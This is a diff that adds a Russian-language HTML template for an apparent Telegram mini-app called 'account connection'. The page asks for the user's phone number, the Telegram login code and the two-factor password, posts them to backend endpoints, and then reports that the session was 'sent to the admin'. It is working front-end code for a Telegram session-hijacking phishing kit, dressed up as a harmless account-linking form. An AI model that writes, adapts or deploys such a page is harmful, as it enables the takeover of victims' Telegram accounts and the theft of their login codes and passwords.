@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Подключение аккаунта</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #000;
+            color: #fff;
+            font-family: 'Arial', sans-serif;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+        
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(41, 196, 255, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(255, 196, 41, 0.1) 0%, transparent 50%);
+            animation: backgroundMove 20s infinite linear;
+        }
+        
+        .dots {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(#fff 1px, transparent 1px);
+            background-size: 50px 50px;
+            animation: dotsMove 30s infinite linear;
+        }
+        
+        .container {
+            position: relative;
+            z-index: 10;
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 30px;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #ccc;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #0088cc;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #0088cc;
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        
+        .btn:hover {
+            background: #0066aa;
+        }
+        
+        .btn:disabled {
+            background: #555;
+            cursor: not-allowed;
+        }
+        
+        .step {
+            display: none;
+        }
+        
+        .step.active {
+            display: block;
+        }
+        
+        .back-btn {
+            background: transparent;
+            border: 1px solid #555;
+            margin-top: 10px;
+        }
+        
+        .back-btn:hover {
+            background: rgba(255,255,255,0.1);
+        }
+        
+        .status {
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            text-align: center;
+        }
+        
+        .status.success {
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid #0f0;
+        }
+        
+        .status.error {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid #f00;
+        }
+    </style>
+</head>
+<body>
+    <div class="background"></div>
+    <div class="dots"></div>
+    
+    <div class="container">
+        <h2 style="text-align: center; margin-bottom: 30px;">🔗 Подключение аккаунта</h2>
+        
+        <!-- Шаг 1: Ввод номера -->
+        <div id="step-phone" class="step active">
+            <div class="form-group">
+                <label for="phone">Номер телефона:</label>
+                <input type="text" id="phone" placeholder="+79123456789" required>
+            </div>
+            <button class="btn" onclick="sendCode()">Отправить код</button>
+        </div>
+        
+        <!-- Шаг 2: Ввод кода -->
+        <div id="step-code" class="step">
+            <div class="form-group">
+                <label for="code">Код из Telegram:</label>
+                <input type="text" id="code" placeholder="12345" required>
+            </div>
+            <button class="btn" onclick="verifyCode()">Подтвердить</button>
+            <button class="btn back-btn" onclick="backToPhone()">Назад</button>
+        </div>
+        
+        <!-- Шаг 3: Ввод пароля (если нужно) -->
+        <div id="step-password" class="step">
+            <div class="form-group">
+                <label for="password">Пароль 2FA:</label>
+                <input type="password" id="password" placeholder="Ваш пароль" required>
+            </div>
+            <button class="btn" onclick="verifyPassword()">Подтвердить</button>
+            <button class="btn back-btn" onclick="backToCode()">Назад</button>
+        </div>
+        
+        <!-- Статус -->
+        <div id="status"></div>
+    </div>
+
+    <script>
+        const user_id = "{{ user_id }}";
+        
+        function showStep(stepId) {
+            document.querySelectorAll('.step').forEach(step => {
+                step.classList.remove('active');
+            });
+            document.getElementById(stepId).classList.add('active');
+        }
+        
+        function showStatus(message, type) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerHTML = message;
+            statusDiv.className = `status ${type}`;
+        }
+        
+        function clearStatus() {
+            document.getElementById('status').innerHTML = '';
+            document.getElementById('status').className = 'status';
+        }
+        
+        async function sendCode() {
+            const phone = document.getElementById('phone').value;
+            if (!phone) {
+                showStatus('Введите номер телефона', 'error');
+                return;
+            }
+            
+            clearStatus();
+            showStatus('Отправка кода...', '');
+            
+            try {
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        phone: phone,
+                        user_id: user_id
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    showStep('step-code');
+                    showStatus('Код отправлен! Проверьте Telegram.', 'success');
+                } else {
+                    showStatus('Ошибка: ' + data.message, 'error');
+                }
+            } catch (error) {
+                showStatus('Ошибка сети', 'error');
+            }
+        }
+        
+        async function verifyCode() {
+            const code = document.getElementById('code').value;
+            if (!code) {
+                showStatus('Введите код', 'error');
+                return;
+            }
+            
+            clearStatus();
+            showStatus('Проверка кода...', '');
+            
+            try {
+                const response = await fetch('/api/verify', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        code: code
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    showStatus('✅ Аккаунт успешно подключен! Сессия отправлена админу.', 'success');
+                    setTimeout(() => {
+                        if (window.TelegramWebApp) {
+                            window.TelegramWebApp.close();
+                        }
+                    }, 3000);
+                } else if (data.status === 'need_password') {
+                    showStep('step-password');
+                    showStatus('Требуется пароль двухфакторной аутентификации', '');
+                } else {
+                    showStatus('Ошибка: ' + data.message, 'error');
+                }
+            } catch (error) {
+                showStatus('Ошибка сети', 'error');
+            }
+        }
+        
+        async function verifyPassword() {
+            const password = document.getElementById('password').value;
+            if (!password) {
+                showStatus('Введите пароль', 'error');
+                return;
+            }
+            
+            clearStatus();
+            showStatus('Проверка пароля...', '');
+            
+            try {
+                const response = await fetch('/api/verify', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        code: document.getElementById('code').value,
+                        password: password
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    showStatus('✅ Аккаунт успешно подключен! Сессия отправлена админу.', 'success');
+                    setTimeout(() => {
+                        if (window.TelegramWebApp) {
+                            window.TelegramWebApp.close();
+                        }
+                    }, 3000);
+                } else {
+                    showStatus('Ошибка: ' + data.message, 'error');
+                }
+            } catch (error) {
+                showStatus('Ошибка сети', 'error');
+            }
+        }
+        
+        function backToPhone() {
+            showStep('step-phone');
+            clearStatus();
+        }
+        
+        function backToCode() {
+            showStep('step-code');
+            clearStatus();
+        }
+        
+        // Инициализация Telegram Web App
+        if (window.TelegramWebApp) {
+            TelegramWebApp.ready();
+            TelegramWebApp.expand();
+        }
+    </script>
+</body>
+</html>
